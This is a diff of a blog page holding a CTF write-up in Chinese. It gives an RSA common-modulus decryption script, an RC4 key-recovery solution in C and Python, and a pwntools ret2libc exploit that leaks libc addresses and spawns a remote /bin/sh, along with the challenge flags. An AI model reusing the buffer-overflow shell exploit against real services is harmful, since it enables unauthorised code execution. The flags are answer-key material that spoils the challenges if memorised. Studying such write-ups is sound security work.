+n=0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L
+def egcd(a, b):
+  if a == 0:
+    return (b, 0, 1)
+  else:
+    g, y, x = egcd(b % a, a)
+    return (g, x - (b // a) * y, y)
+fo1 = open(&#39;flag.enc1&#39;, &#39;rb&#39;)
+fo2 = open(&#39;flag.enc2&#39;, &#39;rb&#39;)
+datafo1 = fo1.read()
+c1 = s2n(datafo1)
+fo1.close()
+datafo2 = fo2.read()
+c2 = s2n(datafo2)
+fo2.close()
+c2 = invert(c2,n)
+e1 = 17
+e2 = 65537
+s = egcd(e1,e2)
+s1 = s[1]
+s2 = s[2]
+s2 = - s2
+m = pow(c1, s1, n) * pow(c2, s2, n) % n
+print n2s(m)
+</code></pre><p>flag.txt:<br>“You were not born a winner, and you were not born a loser. You are what you make yourself be.”SDCTF{ef31070d66440687a73beb6242f298bc}</p>
+<h1 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h1><h2 id="Bin300-RC4"><a href="#Bin300-RC4" class="headerlink" title="Bin300(RC4)"></a>Bin300(RC4)</h2><p>RC4算法,逆向得到key和data<br>key= “I_am_the_flag”;<br>data={19,118,31,-9,43,-100,54,-56,-85,-91,-65,-51,-71,86,-27,-75,79,3,19,89,-46,58,10,68,121,85,-8,-36,-116,75,107,-68,124,81,-101,-112,-73,-80,37}</p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+typedef unsigned longULONG;
+
+void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len)
+{
+    int i = 0, j = 0;
+    char k[256] = { 0 };
+    unsigned char tmp = 0;
+    for (i = 0; i&lt;256; i++)
+    {
+        s[i] = i;
+        k[i] = key[i%Len];
+    }
+    for (i = 0; i&lt;256; i++)
+    {
+        j = (j + s[i] + k[i]) % 256;
+        tmp = s[i];
+        s[i] = s[j];
+        s[j] = tmp;
+    }
+}
+
+
+void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len)
+{
+    int i = 0, j = 0, t = 0;
+    unsigned long k = 0;
+    unsigned char tmp;
+    for (k = 0; k&lt;Len; k++)
+    {
+        i = (i + 1) % 256;
+        j = (j + s[i]) % 256;
+        tmp = s[i];
+        s[i] = s[j];
+        s[j] = tmp;
+        t = (s[i] + s[j]) % 256;
+        Data[k] ^= s[t];
+    }
+}
+
+int main()
+{
+    char s[256] = { 0 }, s2[256] = { 0 };
+    char key[256] = &quot;I_am_the_flag&quot;;
+    char flag[512]= {19,118,31,-9,43,-100,54,-56,-85,-91,-65,-51,-71,86,-27,-75,79,3,19,89,-46,58,10,68,121,85,-8,-36,-116,75,107,-68,124,81,-101,-112,-73,-80,37};
+    unsigned long len = strlen(flag); 
+    int i;
+    rc4_init(s, (unsigned char*)key, strlen(key));
+    rc4_crypt(s, (unsigned char*)flag, len);
+    printf(&quot;%s&quot;,flag);
+    return 0;
+}
+</code></pre><p>或py解密</p>
+<pre><code># -*- coding: utf-8 -*-
+import random, base64,binascii
+from hashlib import sha1
+
+def crypt(data, key):
+    &quot;&quot;&quot;RC4 algorithm&quot;&quot;&quot;
+    x = 0
+    box = range(256)
+    for i in range(256):
+        x = (x + box[i] + ord(key[i % len(key)])) % 256
+        box[i], box[x] = box[x], box[i]
+    x = y = 0
+    out = []
+    for char in data:
+        x = (x + 1) % 256
+        y = (y + box[x]) % 256
+        box[x], box[y] = box[y], box[x]
+        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
+    return &#39;&#39;.join(out)
+
+data = &quot;数据&quot;
+key = &#39;密钥&#39;
+decoded_data = crypt(data,key)
+print decoded_data
+</code></pre><p>Flag:SDCTF{912128f324fd3ea3f5d9cb517b4d9001}</p>
+<h2 id="Bin500-PwnPwnPwn"><a href="#Bin500-PwnPwnPwn" class="headerlink" title="Bin500(PwnPwnPwn)"></a>Bin500(PwnPwnPwn)</h2><pre><code>#!/usr/bin/env python
+from pwn import *
+
+libc = ELF(&#39;libc.so.6&#39;)
+elf = ELF(&#39;bin300&#39;)
+debug =0
+if debug ==1:
+  p = process(&#39;./bin300&#39;)
+else:
+  p = remote(&#39;123.207.144.156&#39;, 10003)
+
+plt_write = elf.symbols[&#39;write&#39;]
+got_write = elf.got[&#39;write&#39;]
+vulfun_addr = 0x804843b
+payload1 = &#39;a&#39;*268  
+payload1 += p32(plt_write) 
+payload1 += p32(vulfun_addr) 
+payload1 += p32(1)
+payload1 += p32(got_write) 
+payload1 += p32(4)
+p.send(payload1)
+
+write_addr = u32(p.recv(4))
+system_addr = write_addr - (libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;])
+binsh_addr = write_addr - (libc.symbols[&#39;write&#39;] - next(libc.search(&#39;/bin/sh&#39;)))
+payload2 = &#39;a&#39;*268
+payload2 += p32(system_addr)
+payload2 += p32(vulfun_addr)
+payload2 += p32(binsh_addr)
+p.send(payload2)
+p.interactive()
+</code></pre><p><img src="/images/sdctf/13.png" alt=""></p>
+<p>Flag:SDCTF{af15d5fdacd5fdfea300e88a8e253e82}</p>
+
         
     
 
@@ -695,7 +768,7 @@ modprobe
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2017/07/24/off-by-one/" id="post_nav-newer" class="prev-content">
+        <a href="/archives/Linux.righte0us" id="post_nav-newer" class="prev-content">
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                 <i class="material-icons">arrow_back</i>
             </button>
@@ -709,7 +782,7 @@ modprobe
 
     <!-- Next Nav -->
     
-        <a href="/2017/04/08/SDCTF/" id="post_nav-older" class="next-content">
+        <a href="/archives/ARM2.righte0us" id="post_nav-older" class="next-content">
             旧篇
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
@@ -972,7 +1045,7 @@ It will not impact the appearance and can give developers a lot of support :)
 
         <!--Copyright-->
         <div id="copyright">
-            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>Righteous
+            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>Righteous'Blog
             
         </div>
 
